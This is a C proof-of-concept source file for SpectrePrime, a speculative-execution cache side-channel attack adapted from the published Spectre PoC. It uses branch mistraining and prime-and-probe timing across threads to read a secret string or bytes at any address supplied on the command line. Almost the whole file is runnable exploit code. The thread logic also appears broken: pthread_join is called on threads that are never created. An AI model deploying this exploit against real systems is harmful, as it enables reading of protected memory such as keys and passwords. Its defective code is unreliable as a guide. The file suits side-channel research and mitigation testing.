/*
* =====================================================================================
* Filename: spectreprime-poc.c
* Description: POC SpectrePrime
*
* Version: 0.1
* Created: 01/21/2018
* Revision: none
* Compiler: gcc -pthread spectreprime-poc.c -o poc
* Author: Caroline Trippel
*
* Adapted from POC Spectre
* POC Spectre Authors: Paul Kocher, Daniel Genkin, Daniel Gruss, Werner Haas, Mike Hamburg,
* Moritz Lipp, Stefan Mangard, Thomas Prescher, Michael Schwarz, Yuval Yarom (2017)
* =====================================================================================
*/
#define _GNU_SOURCE
#include "pthread.h"
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <stdint.h>

#pragma comment (lib, "pthreadVC2.lib")

struct pp_arg_struct {
	int junk;
	int tries;
	int *results;
};

struct pt_arg_struct {
	size_t malicious_x;
	int tries;
};

#define handle_error_en(en, msg) \
do { errno = en; perror(msg); exit(EXIT_FAILURE); } while (0)

#ifdef _MSC_VER

#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];
volatile int flag = 0;

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler wonat optimize out victim_function() */

void victim_function(size_t x) {
	if (x < array1_size) {
		//__asm__("lfence"); or __asm__("mfence"); /* both break Spectre & SpectrePrime in our experiments*/
		array2[array1[x] * 512] = 1;
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_MISS_THRESHOLD (60) /* assume cache miss if time >= threshold */

int prime() {
	int i, junk = 0;
	for (i = 0; i < 256; i++)
		junk += array2[i * 512];
	return junk;
}

void test(size_t malicious_x, int tries) {
	int j;
	size_t training_x, x;
	training_x = tries % array1_size;
	for (j = 29; j >= 0; j--) {
		_mm_clflush(&array1_size);
		volatile int z = 0;
		for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */

		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
		/* Avoid jumps in case those tip off the branch predictor */
		x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
		x = training_x ^ (x & (malicious_x ^ training_x));

		/* Call the victim! */
		victim_function(x);
	}
}

void probe(int junk, int tries, int results[256]) {
	int i, mix_i;
	volatile uint8_t *addr;
	register uint64_t time1, time2;
	for (i = 0; i < 256; i++) {
		mix_i = ((i * 167) + 13) & 255;
		addr = &array2[mix_i * 512];
		time1 = __rdtscp(&junk); /* READ TIMER */
		junk = *addr; /* MEMORY ACCESS TO TIME */
		time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
		if (time2 >= CACHE_MISS_THRESHOLD && mix_i != array1[tries % array1_size])
			results[mix_i]++; /* cache hit - add +1 to score for this value */
	}
}

void *primeProbe(void *arguments) { //int junk, int tries, int results[256]) {
	struct pp_arg_struct *args = arguments;
	int junk = args->junk;
	int tries = args->tries;
	int *results = args->results;

	prime();
	while (flag != 1) {}
	flag = 0;
	probe(junk, tries, results);
}

void *primeTest(void *arguments) { //size_t malicious_x, int tries) {
	struct pt_arg_struct *args = arguments;
	size_t malicious_x = args->malicious_x;
	int tries = args->tries;

	prime();
	test(malicious_x, tries);
	flag = 1;
}

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, junk = 0;

	pthread_t pp_thread, pt_thread;

	struct pp_arg_struct pp_args;
	struct pt_arg_struct pt_args;

	pt_args.malicious_x = malicious_x;
	pp_args.results = results;
	pp_args.junk = junk;

	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (tries = 999; tries > 0; tries--) {
		pp_args.tries = tries;
		pt_args.tries = tries;
		
		// join threads
		pthread_join(pp_thread, NULL);
		pthread_join(pt_thread, NULL);
		
		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above wonat get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char **argv) {
	size_t malicious_x = (size_t)(secret - (char*)array1); /* default for malicious_x */
	int i, j, s, score[2], len = 40;
	uint8_t value[2];
	
	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3) {
		sscanf(argv[1], "%p", (void**)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf(argv[2], "%d", &len);
	}
	
	printf("Reading %d bytes:\n", len);
	while (--len >= 0) {
		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X=%c score=’%d’ ",
			value[0],
			(value[0] > 31 && value[0] < 127 ? value[0] : '?'),
			score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X=%c score=%d)", value[1], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[1]);
		printf("\n");
	}
	getchar();
	return (0);
}
